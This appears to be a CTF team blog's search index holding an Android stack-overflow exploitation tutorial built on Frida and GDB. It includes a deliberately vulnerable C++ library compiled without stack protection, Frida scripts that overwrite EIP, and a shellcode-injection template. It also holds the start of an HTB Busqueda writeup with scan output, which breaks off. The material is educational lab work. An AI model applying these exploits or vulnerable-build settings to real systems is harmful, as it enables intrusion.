{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home Page","text":""},{"location":"#home-page","title":"Home Page","text":"<p>Welcome to our Blog. We are a group of cybersecurity experts and researchers passionate about Security Research, and Capture The Flag contests. We specialize in reverse engineering, cryptography, web exploitation, blockchain, and more, pushing the limits of security knowledge through hands-on challenges and real-world attack simulations.</p> <p>Beyond competing, we believe in community-driven learning. We organize, collaborate, and contribute to CTF events, helping others sharpen their skills while growing together as a team. Whether you're here to learn, compete, or collaborate, we welcome you to explore the world of cybersecurity with us! If you are interested in collaboration You can contact us through  \ud83d\ude80</p>"},{"location":"About-Us/","title":"About Us","text":""},{"location":"About-Us/#about-us","title":"About Us","text":""},{"location":"Blog-Posts/","title":"Blog Posts","text":""},{"location":"Blog-Posts/#blog-posts","title":"Blog Posts","text":"<p>Welcome to our blog posts</p> <ul> <li>Android Stack Overflow Exploitation with Frida</li> <li>Analyzing MSFVenom Android Payload</li> <li>HTB Busqueda Machine Writeup</li> <li>PWN - Stack binary exploiting Writeup</li> </ul>"},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/","title":"Exploring Android Exploitation: A Journey into Stack Overflow Vulnerability","text":"<p>My journey into Android exploitation at the binary level started with a deep passion for the subject. I was determined to simplify the process as much as possible, but it turned out to be quite challenging. In this post, you'll learn various aspects of Android exploitation, including:</p> <ul> <li>How to use the NDK to write an application.</li> <li>How to create a vulnerable lab environment for demonstrating Stack Overflow vulnerabilities.</li> <li>How to exploit Stack Overflow in Android binaries.</li> <li>How to Debug an Android Native Binary Remotely with GDB</li> <li>A deep dive into the capabilities of Frida!</li> </ul> <p>I conducted all the steps in this post on an x86 Android emulator (Genymotion).</p>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#why-frida","title":"Why Frida?","text":"<p>You might wonder why I used Frida. There were two main reasons:</p> <ol> <li>Passion: I absolutely love working with Frida!</li> <li>Practicality: I couldn't find another way to send my binary data for overriding the EIP.</li> </ol> <p>I hope you find this content innovative and insightful.</p> <p> </p>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#creating-the-vulnerable-application","title":"Creating the Vulnerable Application","text":"","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#implementing-graphical-user-interface","title":"Implementing Graphical User Interface","text":"<p>The first step in creating our vulnerable application is to edit the style of the <code>MainActivity</code>. The goal here is to set up an interface that allows us to input data for buffer exploitation and includes a button to submit the value. </p> <p>Below is the XML code for <code>activity_main.xml</code>:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    android:orientation=\"vertical\"\n    tools:context=\".MainActivity\"&gt;\n\n    &lt;EditText\n        android:id=\"@+id/user_input\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        android:hint=\"Enter input\" /&gt;\n\n    &lt;Button\n        android:id=\"@+id/exploit_button\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"Exploit\" /&gt;\n\n    &lt;TextView\n        android:id=\"@+id/result_text\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:text=\"Result will be shown here\" /&gt;\n&lt;/LinearLayout&gt;\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#implementing-vulnerable-native-c-code","title":"Implementing Vulnerable Native C++ Code","text":"<p>To introduce a vulnerability, we'll use native C++ code that is susceptible to a stack overflow.</p> <p></p> <p>Below, I've defined three functions, starting with the <code>main</code> function. This function simply returns the user input value.</p> <p>Here's the C++ code for the main function:</p> <pre><code>extern \"C\" JNIEXPORT jstring JNICALL\nJava_com_example_myapplication_MainActivity_stringFromJNI(\n        JNIEnv* env,\n        jobject,\n        jstring input) {\n    const char* inputCStr = env-&gt;GetStringUTFChars(input, nullptr);\n    kousha(inputCStr);\n    env-&gt;ReleaseStringUTFChars(input, inputCStr);\n    return env-&gt;NewStringUTF(inputCStr);\n}\n</code></pre> <p>The second function in our vulnerable native C++ code is <code>kousha</code>. This function is called by <code>Java_com_example_myapplication_MainActivity_stringFromJNI</code> and is responsible for copying the user input characters one by one into a fixed-size buffer. </p> <p>Below is the C++ code for the <code>kousha</code> function:</p> <pre><code>int kousha(const char* inputCStr) {\n    char buffer[10];\n    const char *p1 = inputCStr;\n    char *p2 = buffer;\n    while (1) {\n        *p2 = *p1;\n        if (*p1 == 0) {\n            break;\n        }\n        p1 = p1 + 1;\n        p2 = p2 + 1;\n    }\n    return 0;\n}\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#implementing-the-getsecret-function","title":"Implementing the <code>getSecret</code> Function","text":"<p>The final piece of our vulnerable application is the <code>Java_com_example_myapplication_MainActivity_getSecret</code> function. The goal of this lab is to exploit the stack overflow and override the EIP register to call this function. When successfully called, this function will log \"Yeah!\" in the <code>adb logcat</code> output.</p> <p>Before diving into the function itself, don't forget to define the logging macro at the beginning of your C++ file:</p> <pre><code>#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)\n</code></pre> <p>Here's the C++ code for the getSecret function:</p> <pre><code>extern \"C\" JNIEXPORT jstring JNICALL\nJava_com_example_myapplication_MainActivity_getSecret(\n        JNIEnv* env,\n        jobject) {\n    std::string hello = \"Yeah!\";\n    LOGI(\"%s\", hello.c_str());\n    return env-&gt;NewStringUTF(hello.c_str());\n}\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#code-explanation","title":"Code Explanation:","text":"<ul> <li>Logging Setup: The macro <code>LOGI</code> is defined to log informational messages to the Android <code>logcat</code>. This is essential for seeing the \"Yeah!\" message in the log output.</li> <li>Function Declaration: Like the previous functions, this one is declared with <code>extern \"C\"</code> to ensure proper linkage for JNI.</li> <li>Logging the Message: The function logs the string \"Yeah!\" to the <code>adb logcat</code> using the <code>LOGI</code> macro.</li> <li>Returning the String: Finally, the function returns the \"Yeah!\" string as a new <code>jstring</code> back to the Java layer.</li> </ul>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#exploit-goal","title":"Exploit Goal:","text":"<p>The goal of this lab is to craft an exploit that causes the kousha function's stack overflow to override the EIP register, redirecting execution to the getSecret function. When successful, you\u2019ll see \"Yeah!\" logged in the adb logcat output, confirming that the exploit worked.</p>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#full-code-for-vulnerable-native-c-functions","title":"Full Code for Vulnerable Native C++ Functions","text":"<p>Below is the complete C++ code for the vulnerable native functions used in our Android application. This code includes logging macros, the vulnerable <code>kousha</code> function, and the <code>getSecret</code> function, which we aim to call via an exploit.</p> <pre><code>#include &lt;jni.h&gt;\n#include &lt;string&gt;\n#include &lt;android/log.h&gt;\n\n#define LOG_TAG \"MyApplication\"\n#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)\n#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)\n\nint kousha(const char* inputCStr) {\n    char buffer[10];\n    const char *p1 = inputCStr;\n    char *p2 = buffer;\n    while (true) {\n        *p2 = *p1;\n        if (*p1 == 0) {\n            break;\n        }\n        p1 = p1 + 1;\n        p2 = p2 + 1;\n    }\n    return 0;\n}\n\nextern \"C\" JNIEXPORT jstring JNICALL\nJava_com_example_myapplication_MainActivity_stringFromJNI(\n        JNIEnv* env,\n        jobject,\n        jstring input) {\n    const char* inputCStr = env-&gt;GetStringUTFChars(input, nullptr);\n    kousha(inputCStr);\n    env-&gt;ReleaseStringUTFChars(input, inputCStr);\n    return env-&gt;NewStringUTF(inputCStr);\n}\n\nextern \"C\" JNIEXPORT jstring JNICALL\nJava_com_example_myapplication_MainActivity_getSecret(\n        JNIEnv* env,\n        jobject) {\n    std::string hello = \"Yeah!\";\n    LOGI(\"%s\", hello.c_str());\n    return env-&gt;NewStringUTF(hello.c_str());\n}\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#modifying-cmakeliststxt-for-security-settings-and-library-inclusion","title":"Modifying <code>CMakeLists.txt</code> for Security Settings and Library Inclusion","text":"<p>To set up our build environment for the vulnerable application, we need to modify the <code>CMakeLists.txt</code> file. This involves disabling the <code>FORTIFY</code> security feature and adding the <code>native-lib</code> library.</p> <p></p> <p>Here is the updated <code>CMakeLists.txt</code> configuration:</p> <pre><code>cmake_minimum_required(VERSION 3.22.1)\nproject(\"myapplication\")\n\n# Add the native-lib library\nadd_library(native-lib SHARED\n        native-lib.cpp)\n\n# Set compiler flags to disable security features and enable debugging\nset(CMAKE_CXX_FLAGS \"${CMAKE_CXX_FLAGS} -fno-stack-protector -U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0 -O0 -g\")\n\n# Link the native-lib library with Android and log libraries\ntarget_link_libraries(native-lib\n        android\n        log)\n</code></pre> <p>Build and run the project now.</p> <p></p>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#exploiting-stack-overflow","title":"Exploiting Stack Overflow","text":"<p>Now it's time to trigger a crash. We'll send an excessive number of characters to cause a buffer overflow and crash the app. Send the following input to trigger the buffer overflow: <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></p> <p></p> <p>Now that we know the application is vulnerable, use the <code>cyclic</code> function from the <code>pwntools</code> Python framework to determine the amount of data needed to reach and override the <code>EIP</code> register.</p> <p></p> <p>We observed that the fault address is <code>0x61656161</code>, which corresponds to the last value of <code>EIP</code> when the app crashes.</p> <p></p> <p>Now, we can determine the offset needed to override the <code>EIP</code> register and execute our <code>getSecret</code> function.</p> <p></p> <p>Everything has been smooth so far, but we're about to hit a challenging part. Grab a cup of coffee and let's dive in.</p> <p>Even if we have the address of the <code>getSecret</code> function, passing it as a text input could be tricky. We might explore using Unicode characters, though their effectiveness is uncertain. That's why I'm turning to Frida for a solution.</p> <p>Before we dive into Frida, let's complete the final step of our current task. We'll use GDB for remote debugging to confirm that the <code>EIP</code> register has been successfully overwritten.</p> <p>I\u2019ve set up gdbserver on the Android device and attached it to the vulnerable application with the following command:</p> <pre><code>./gdbserver :7777 --attach $(ps | grep myapp | awk '{print $2}')\n</code></pre> <p>I then forwarded port 7777 from the Android device to my host using:</p> <pre><code>adb forward tcp:7777 tcp:7777\n</code></pre> <p>Next, I started GDB and connected to the remote application using:</p> <pre><code>target remote :7777\n</code></pre> <p></p> <p>The application is currently stopped. Set a breakpoint on the <code>kousha</code> function using the following GDB command:</p> <p></p><pre><code>b *kousha\n</code></pre> Then, use the c command to continue execution:<p></p> <pre><code>c\n</code></pre> <p></p> <p>I used <code>aaaaaaaaaaaaaabcde</code> as the input. This consists of 14 'a' characters to reach the offset and <code>bcde</code> to overwrite the <code>EIP</code> register. The breakpoint will be hit, and GDB will stop at the first instruction of the <code>kousha</code> function. You can view the next 30 instructions with:</p> <pre><code>x/30i $eip\n</code></pre> <p></p> <p>You might see a <code>jmp</code> instruction creating a loop that corresponds to the <code>while</code> loop in the <code>kousha</code> function. Set a breakpoint after the loop and continue debugging.</p> <p></p> <p>Use the <code>ni</code> (next instruction) command in GDB to step through the instructions one by one. After executing the <code>pop ebp</code> instruction, the <code>ebp</code> register will show <code>aaaa</code>.</p> <p></p> <p>When the <code>ret</code> instruction is executed, the <code>eip</code> register will be set to <code>bcde</code>.</p> <p></p> <p>We successfully overwrote the <code>EIP</code> register with the value <code>bcde</code>. Now, the goal is to override it with the address of our <code>getSecret</code> function. To do this, let's dive into Frida.</p> <p>I\u2019ve set up the Frida Server on the Android Emulator, enabling us to connect to it. The plan involves three steps:</p> <ul> <li>Find the Base Address of the <code>getSecret</code> Function.</li> <li>Craft a Payload <code>(offset + *getSecret)</code>.</li> <li>Send the Payload as User Input to Trigger the Overflow.</li> </ul> <p>However, it's not as straightforward as it sounds. After trying several methods to modify the user input, I found that hooking <code>GetStringUTFChars</code> was the most effective approach. So, we'll hook <code>GetStringUTFChars</code> from the <code>libnative-lib.so</code> library.</p> <p>For additional learning, I've included some extra code to explore Frida's capabilities, such as finding the base address of a library using <code>Module.findBaseAddress(\"libname.so\")</code>.</p> <p>Here's the Frida script:</p> <pre><code>var libnative_lib_so = 'libnative-lib.so';\n\nfunction start_timer_for_intercept() {\n  setTimeout(function() {\n    console.log(\"[+] \" + libnative_lib_so + \" Base Address -&gt; \" + Module.findBaseAddress(libnative_lib_so));\n\n    var offset_of_GetStringUTFChars = 0x51110;\n    var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars);\n\n    Interceptor.attach(dynamic_address_of_GetStringUTFChars, {\n      onLeave: function(retval) {\n        var uInput = retval.readCString();\n        if (uInput == \"exploit\") {\n          console.log(\"We are done!\");\n        }\n      }\n    });\n  }, 2000);\n}\n\nstart_timer_for_intercept();\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#explanation","title":"Explanation:","text":"<ul> <li>Finding the Base Address: The base address of <code>libnative-lib.so</code> is retrieved and logged.</li> <li>Offset Calculation: We calculate the dynamic address of <code>GetStringUTFChars</code> by adding its offset to the base address.</li> <li>Hooking GetStringUTFChars: We use Frida's <code>Interceptor.attach</code> to hook the <code>GetStringUTFChars</code> function. If the user input matches \"exploit\", it confirms that the hook is working as expected.</li> </ul> <p>This setup allows us to intercept and modify the input before it's used in the vulnerable function, helping us to overwrite the <code>EIP</code> with the <code>getSecret</code> address.</p> <p></p> <p>Now, let's craft our payload. We need 14 bytes as an offset to reach the <code>EIP</code> register, followed by the base address of the <code>getSecret</code> function. However, there's a crucial detail: in our previous code, we only used <code>console.log()</code>. To exploit the vulnerability, we need to return an address as the <code>retval</code>. This requires allocating space in the heap.</p> <p>Below is the code that does this:</p> <pre><code>var libnative_lib_so = 'libnative-lib.so';\n\nfunction start_timer_for_intercept() {\n  setTimeout(function() {\n    // Find the base address of the library\n    console.log(\"[+] \" + libnative_lib_so + \" Base Address -&gt; \" + Module.findBaseAddress(libnative_lib_so));\n    var offset_of_GetStringUTFChars = 0x51110; // Replace with the actual offset\n    var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars);\n\n    // Allocate space in the heap for our payload\n    var memoryForPayload = Memory.alloc(100);\n\n    // Craft the payload: 14 'A's (0x41) followed by 'B's (0x42) to overwrite EIP\n    var payload = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];\n    payload.push(0x42, 0x42, 0x42, 0x42);\n\n    // Write the payload into the allocated memory\n    Memory.writeByteArray(memoryForPayload, payload);\n\n    // Hook the GetStringUTFChars function and replace the return value with our payload\n    Interceptor.attach(dynamic_address_of_GetStringUTFChars, {\n      onLeave: function(retval) {\n        var uInput = retval.readCString();\n        if (uInput == \"exploit\") {\n          retval.replace(memoryForPayload); // Replace retval with our crafted payload\n          console.log(\"We are done!\");\n        }\n      }\n    });\n  }, 2000);\n}\n\nstart_timer_for_intercept();\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#explanation_1","title":"Explanation:","text":"<ul> <li>Memory Allocation:</li> <li>Memory.alloc(100): Allocates 100 bytes in the heap for our payload.</li> <li>Crafting the Payload:</li> <li>payload = [0x41, ...]: Fills the first 14 bytes with 0x41 ('A') to reach the <code>EIP</code> register.</li> <li> <p>payload.push(0x42, 0x42, 0x42, 0x42): Adds 0x42 ('B') to overwrite the <code>EIP</code> register.</p> </li> <li> <p>Replacing the Return Value:</p> </li> <li>retval.replace(memoryForPayload): Replaces the original return value of <code>GetStringUTFChars</code> with our crafted payload.</li> </ul> <p>This code will modify the user input to include the crafted payload, allowing us to overwrite the <code>EIP</code> register and execute the <code>getSecret</code> function.</p> <p>Now that we\u2019ve identified how to trigger the overflow, it\u2019s time to execute the real exploit: overriding the <code>EIP</code> register with the address of the <code>getSecret</code> function.</p> <p></p> <p>Here's the process:</p> <ul> <li>Find the Base Address of getSecret:</li> <li> <p>We use <code>Module.findExportByName()</code> to locate the base address of the getSecret function within the <code>libnative-lib.so</code> library.</p> </li> <li> <p>Convert the Address:</p> </li> <li> <p>After finding the address, we convert it to a hexadecimal format suitable for the <code>EIP</code> register.</p> </li> <li> <p>Adjust for Endianness:</p> </li> <li> <p>The address is pushed in reverse order due to endianness, which ensures the correct function call.</p> </li> <li> <p>Execute the Exploit:</p> </li> <li>Finally, we hook the <code>GetStringUTFChars</code> function to replace the user input with our crafted payload, which includes the address of <code>getSecret</code>.</li> </ul> <pre><code>var libnative_lib_so = 'libnative-lib.so';\n\nfunction start_timer_for_intercept() {\n  setTimeout(function() {\n    console.log(\"[+] \" + libnative_lib_so + \" Base Address -&gt; \" + Module.findBaseAddress(libnative_lib_so));\n\n    var offset_of_GetStringUTFChars = 0x51110; // Offset for GetStringUTFChars\n    var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars);\n\n    // Allocate memory for the payload\n    var memoryForPayload = Memory.alloc(100);\n    var payload = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];\n\n    // Find the address of getSecret\n    var getSecret = Module.findExportByName(\"libnative-lib.so\", \"Java_com_example_myapplication_MainActivity_getSecret\");\n    var getSecretAddr = getSecret.toString().match(/[\\s\\S]{1,2}/g) || [];\n\n    // Push the getSecret address in reverse order due to endianness\n    payload.push(parseInt(getSecretAddr[4], 16), parseInt(getSecretAddr[3], 16), parseInt(getSecretAddr[2], 16), parseInt(getSecretAddr[1], 16));\n    Memory.writeByteArray(memoryForPayload, payload);\n\n    // Hook GetStringUTFChars and replace the return value with our crafted payload\n    Interceptor.attach(dynamic_address_of_GetStringUTFChars, {\n      onLeave: function(retval) {\n        var uInput = retval.readCString();\n        if (uInput == \"exploit\") {\n          retval.replace(memoryForPayload); // Replace retval with our crafted payload\n        }\n      }\n    });\n  }, 2000);\n}\n\nstart_timer_for_intercept();\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#summary","title":"Summary","text":"<ul> <li>We first locate the <code>getSecret</code> function's address using <code>Module.findExportByName()</code>.</li> <li>The address is then formatted and adjusted for system endianness.</li> <li>Finally, by hooking the <code>GetStringUTFChars</code> function, we replace the user input with a payload that includes the address of <code>getSecret</code>.</li> <li>When the payload is executed, the application logs \"Yeah!\" to indicate success.</li> </ul> <p>And just like that, we\u2019ve successfully exploited the application to call the <code>getSecret</code> function!</p>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#bonus","title":"Bonus","text":"<p>If you're interested in writing and executing shellcode in memory\u2014like a reverse shell\u2014this section will guide you through the process. The steps include writing the shellcode, allocating memory for it, changing the allocated memory's permissions to make it executable, and then writing the shellcode into that memory.</p> <p></p> <p>Steps to Execute Shellcode:</p> <ul> <li>Write Your Shellcode:</li> <li> <p>First, craft your shellcode. This could be something like a reverse shell.</p> </li> <li> <p>Allocate Memory:</p> </li> <li> <p>Allocate memory for your shellcode, ensuring it's large enough to hold the shellcode and any additional data.</p> </li> <li> <p>Change Memory Permissions:</p> </li> <li> <p>Modify the permissions of the allocated memory region to make it executable.</p> </li> <li> <p>Write Shellcode into Memory:</p> </li> <li> <p>Write the shellcode into the allocated memory.</p> </li> <li> <p>Verify with hexdump():</p> </li> <li>Use <code>hexdump()</code> to inspect the memory where the shellcode is located and ensure everything is as expected.</li> </ul> <pre><code>var libnative_lib_so = 'libnative-lib.so';\n\nfunction start_timer_for_intercept() {\n  setTimeout(function() {\n    console.log(\"[+] \" + libnative_lib_so + \" Base Address -&gt; \" + Module.findBaseAddress(libnative_lib_so));\n\n    var offset_of_GetStringUTFChars = 0x51110; // Offset for GetStringUTFChars\n    var dynamic_address_of_GetStringUTFChars = Module.findBaseAddress(libnative_lib_so).add(offset_of_GetStringUTFChars);\n\n    // Allocate memory for the payload\n    var memoryForPayload = Memory.alloc(100);\n    var payload = [0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41];\n\n    // Write your shellcode here\n    var shellcode = [YOUR_SHELLCODE_GOES_HERE];\n    var memoryForShellcode = Memory.alloc(shellcode.length + 20);\n\n    // Change memory permissions to make it executable\n    Memory.protect(ptr(memoryForShellcode), shellcode.length + 20, 'rwx');\n\n    // Write the shellcode into the allocated memory\n    Memory.writeByteArray(memoryForShellcode, shellcode);\n\n    // Extract the shellcode address and adjust for endianness\n    var shellcodeAddress = memoryForShellcode.toString().match(/[\\s\\S]{1,2}/g) || [];\n    payload.push(parseInt(shellcodeAddress[4], 16), parseInt(shellcodeAddress[3], 16), parseInt(shellcodeAddress[2], 16), parseInt(shellcodeAddress[1], 16));\n    Memory.writeByteArray(memoryForPayload, payload);\n\n    // Log the memory contents for verification\n    console.log(hexdump(memoryForShellcode, { length: 128 }));\n\n    // Hook GetStringUTFChars and replace the return value with our crafted payload\n    Interceptor.attach(dynamic_address_of_GetStringUTFChars, {\n      onLeave: function(retval) {\n        var uInput = retval.readCString();\n        if (uInput == \"exploit\") {\n          retval.replace(memoryForPayload); // Replace retval with our crafted payload\n        }\n      }\n    });\n  }, 2000);\n}\n\nstart_timer_for_intercept();\n</code></pre>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#summary_1","title":"Summary","text":"<ul> <li>Memory Allocation: We allocate memory and change its permissions to allow execution.</li> <li>Shellcode Injection: The shellcode is injected into the allocated memory.</li> <li>Execution: The script is set up to replace the return value of <code>GetStringUTFChars</code> with the payload that includes the shellcode.</li> <li>Verification: Use <code>hexdump()</code> to inspect the shellcode in memory and ensure it's correctly placed.</li> </ul> <p>This approach demonstrates how to write and execute shellcode directly in memory using Frida.</p>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/Android-Stack-Overflow-Exploitation-with-Frida/#authors","title":"Authors","text":"<p>Written by Kousha Zanjani</p>","tags":["Android","Exploitation","ExploitDevelopment","ReverseEngineering","Frida"]},{"location":"Blog-Posts/HTB-Busqueda-Machine-Writeup/","title":"HTB Busqueda Machine Writeup","text":"![Busqueda](./images/Busqueda.png)  <p>When I started getting into cybersecurity and htb I had no idea where to begin, What to do and why enter commands that I found. So in this writeup as it's an easy machine i'll try to write a short part for each command to explain what does the command do, how did I figured out I should use this command, etc. So without any further waste of time lets get to it.</p>"},{"location":"Blog-Posts/HTB-Busqueda-Machine-Writeup/#user-access","title":"User Access","text":""},{"location":"Blog-Posts/HTB-Busqueda-Machine-Writeup/#recon","title":"Recon","text":"<p>First step is obviously finding something to work on. It could be a web service, could be a open ftp, could be anything. So our first step is to run a port scan to find out which ports are open and work on them. </p><pre><code>\u250c\u2500\u2500(d4rknebula\u327fur-home)-[~]\n\u2514\u2500$ rustscan -a 10.10.11.208 -r 0-65535\n.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.\n| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |\n| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |\n`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'\nThe Modern Day Port Scanner.\n________________________________________\n: https://discord.gg/GFrQsGy           :\n: https://github.com/RustScan/RustScan :\n --------------------------------------\n\ud83d\ude35 https://admin.tryhackme.com\n\n[~] The config file is expected to be at \"/home/d4rknebula/.rustscan.toml\"\n[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers\n[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. \nOpen 10.10.11.208:22\nOpen 10.10.11.208:80\n[~] Starting Script(s)\n[&gt;] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\")\n\n[~] Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 09:57 EDT\nInitiating Ping Scan at 09:57\nScanning 10.10.11.208 [2 ports]\nCompleted Ping Scan at 09:57, 0.27s elapsed (1 total hosts)\nInitiating Connect Scan at 09:57\nScanning searcher.htb (10.10.11.208) [2 ports]\nDiscovered open port 22/tcp on 10.10.11.208\nDiscovered open port 80/tcp on 10.10.11.208\nCompleted Connect Scan at 09:57, 0.26s elapsed (2 total ports)\nNmap scan report for searcher.htb (10.10.11.208)\nHost is up, received syn-ack (0.26s latency).\nScanned at 2023-06-18 09:57:17 EDT for 0s\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack\n80/tcp open  http    syn-ack\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 0.58 seconds\n</code></pre> I use rustscan instead of nmap because it's so much faster and when it find the ports then it passes the ports to nmap for a completer scan on only those port.<p></p> <p>Anyway the output of port scan shows us that there is two ports open, 22 which is the ssh port and usually we don't have to do anything with it in htb. And the 80 which is a web server so lets take a look at it. </p><pre><code>\u250c\u2500\u2500(d4rknebula\u327fur-home)-[~]\n\u2514\u2500$ curl -vvv 10.10.11.208\n*   Trying 10.10.11.208:80...\n* Connected to 10.10.11.208 (10.10.11.208) port 80 (#0)\n&gt; GET / HTTP/1.1\n&gt; Host: 10.10.11.208\n&gt; User-Agent: curl/7.81.0\n&gt; Accept: */*\n&gt; \n* Mark bundle as not supporting multiuse\n&lt; HTTP/1.1 302 Found\n&lt; Date: Sun, 18 Jun 2023 14:09:32 GMT\n&lt; Server: Apache/2.4.52 (Ubuntu)\n&lt; Location: http://searcher.htb/\n&lt; Content-Length: 282\n&lt; Content-Type: text/html; charset=iso-8859-1\n&lt; \n&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;\n&lt;html&gt;&lt;head&gt;\n&lt;title&gt;302 Found&lt;/title&gt;\n&lt;/head&gt;&lt;body&gt;\n&lt;h1&gt;Found&lt;/h1&gt;\n&lt;p&gt;The document has moved &lt;a href=\"http://searcher.htb/\"&gt;here&lt;/a&gt;.&lt;/p&gt;\n&lt;hr&gt;\n&lt;address&gt;Apache/2.4.52 (Ubuntu) Server at 10.10.11.208 Port 80&lt;/address&gt;\n&lt;/body&gt;&lt;/html&gt;\n* Connection #0 to host 10.10.11.208 left intact\n</code></pre> So it uses a domain name. Lets add it to our /etc/hosts file so we can take a look at the website.(add <code>10.10.11.208    searcher.htb</code> to your hosts file)<p></p> <p>And opening it in our browse, We'll see a website </p> <p>It's just a website that adds our input to the link for searching of those platforms. </p>"},{"location":"Blog-Posts/HTB-Busqueda-Machine-Writeup/#initial-access","title":"Initial access","text":"<p>I've found the vulnerability in the program myself but after finishing the box when I was reviewing it I found out that there was <code>Powered by Flask and Searchor 2.4.0</code> at the end of the website. searching for it's vulnerabilities gives us poc for code injection.  Using a reverse shell we'll be able to get our initial access to the machine and we can get the user flag at <code>/home/svc/user.txt</code>.</p>"},{"location":"Blog-Posts/HTB-Busqueda-Machine-Writeup/#root-access","title":"Root Access","text":""},{"location":"Blog-Posts/HTB-Busqueda-Machine-Writeup/#recon_1","title":"Recon","text":"<p>Again, we need to find something and then use it or exploit it.</p> <p>Lets see what users exists. </p><pre><code>bash-5.1$ cat /etc/passwd | egrep -v \"(nologin|false|sync)\"\nroot:x:0:0:root:/root:/bin/bash\nsvc:x:1000:1000:svc:/home/svc:/bin/bash\n</code></pre> the egrep command removes the users that are system users or service users or etc that we don't need from output.<p></p> <p>looks like it's only the user that we are currently and the root user.</p> <p>lets see what files are in the user home directory. </p><pre><code>bash-5.1$ ls -lah\ndrwxr-x--- 8 svc  svc  4.0K Jun 18 14:57 .\ndrwxr-xr-x 3 root root 4.0K Dec 22 18:56 ..\nlrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null\n-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout\n-rw-r--r-- 1 svc  svc  3.7K Jan  6  2022 .bashrc\ndrwx------ 2 svc  svc  4.0K Feb 28 11:37 .cache\n-rw-rw-r-- 1 svc  svc   109 Jun 18 13:27 